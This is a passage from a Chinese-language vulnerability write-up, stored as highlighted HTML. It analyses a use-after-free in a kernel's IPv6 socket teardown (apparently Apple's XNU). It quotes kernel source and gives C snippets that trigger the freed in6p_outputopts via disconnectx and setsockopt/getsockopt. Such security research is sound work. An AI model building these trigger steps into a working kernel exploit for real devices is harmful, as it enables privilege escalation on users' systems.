		&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip6_moptions&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;im6o&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

		&lt;span class=&quot;n&quot;&gt;inp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inp_vflag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in6p_options&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;m_freem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in6p_options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;inp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in6p_options&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;ip6_freepcbopts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in6p_outputopts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;// 11&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;ROUTE_RELEASE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in6p_route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;cm&quot;&gt;/* free IPv4 related resources in case of mapped addr */&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inp_options&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;m_free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inp_options&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;inp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inp_options&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;im6o&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in6p_moptions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;inp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;in6p_moptions&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

		&lt;span class=&quot;n&quot;&gt;imo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inp_moptions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;inp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inp_moptions&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

		&lt;span class=&quot;n&quot;&gt;sofreelastref&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;inp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inp_state&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;INPCB_STATE_DEAD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;cm&quot;&gt;/* makes sure we're not called twice from so_close */&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so_flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOF_PCBCLEARING&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

		&lt;span class=&quot;n&quot;&gt;inpcb_gc_sched&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inp_pcbinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;INPCB_TIMER_FAST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

		&lt;span class=&quot;cm&quot;&gt;/*
		 * See inp_join_group() for why we need to unlock
		 */&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;im6o&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;imo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;socket_unlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;im6o&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;IM6O_REMREF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;im6o&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;imo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
				&lt;span class=&quot;n&quot;&gt;IMO_REMREF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;imo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;socket_lock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;so&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;跟到这里我只能说Socket实在是太庞大了！&lt;/p&gt;

&lt;h2 id=&quot;3-探索漏洞触发路径&quot;&gt;3. 探索漏洞触发路径&lt;/h2&gt;

&lt;p&gt;从漏洞分析可以看到这个漏洞函数是可以从用户态进行调用的&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;448&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;AUE_NULL&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;ALL&lt;/span&gt;	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;disconnectx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sae_associd_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sae_connid_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;所以最基本的调用代码如下，调用完函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;disconnectx()&lt;/code&gt;之后，我们就获得了一个存在漏洞的结构体变量&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tcp_sock&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tcp_sock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPPROTO_TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;disconnectx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcp_sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我们知道，UAF漏洞的一个关键点在于释放掉的一个指针后续被继续使用，那我们如何使用一个被关闭后的Socket呢？&lt;/p&gt;

&lt;p&gt;Socket有两个属性读写函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getsockopt()&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setsockopt()&lt;/code&gt;，两个函数的原型如下&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;105&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;AUE_SETSOCKOPT&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;ALL&lt;/span&gt;	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;setsockopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;level&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;caddr_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socklen_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;valsize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; 
&lt;span class=&quot;mi&quot;&gt;118&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;AUE_GETSOCKOPT&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;ALL&lt;/span&gt;	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getsockopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;level&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;caddr_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socklen_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;avalsize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setsockopt()&lt;/code&gt;的第一个参数是Socket变量，第二个参数有多个选择，看操作的层级，第三个是操作的选项名，这个选项名跟第二个参数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;level&lt;/code&gt;有关，第四个参数是新选项值的指针，第五个参数是第四个参数的大小&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define IPV6_USE_MIN_MTU 42
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_minmtu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;minmtu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;socklen_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;minmtu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getsockopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPPROTO_IPV6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPV6_USE_MIN_MTU&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;minmtu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tcp_sock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPPROTO_TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// SOPT_SET&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;minmtu&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;setsockopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcp_sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPPROTO_IPV6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPV6_USE_MIN_MTU&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;minmtu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;minmtu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// // SOPT_GET&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mtu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;get_minmtu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcp_sock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mtu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;NSLog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mtu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;为什么第二个参数和第三个参数要设置成&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IPPROTO_IPV6&lt;/code&gt;和&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IPV6_USE_MIN_MTU&lt;/code&gt;？&lt;/p&gt;

&lt;p&gt;这就要先来看最开始那个没有被置为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NULL&lt;/code&gt;的结构体成员&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inp-&amp;gt;in6p_outputopts&lt;/code&gt;了，这个成员的结构体定义如下&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;ip6_pktopts&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;mbuf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip6po_m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* Pointer to mbuf storing the data */&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;ip6po_hlim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* Hoplimit for outgoing packets */&lt;/span&gt;

	&lt;span class=&quot;cm&quot;&gt;/* Outgoing IF/address information */&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;in6_pktinfo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip6po_pktinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;cm&quot;&gt;/* Next-hop address information */&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;ip6po_nhinfo&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip6po_nhinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

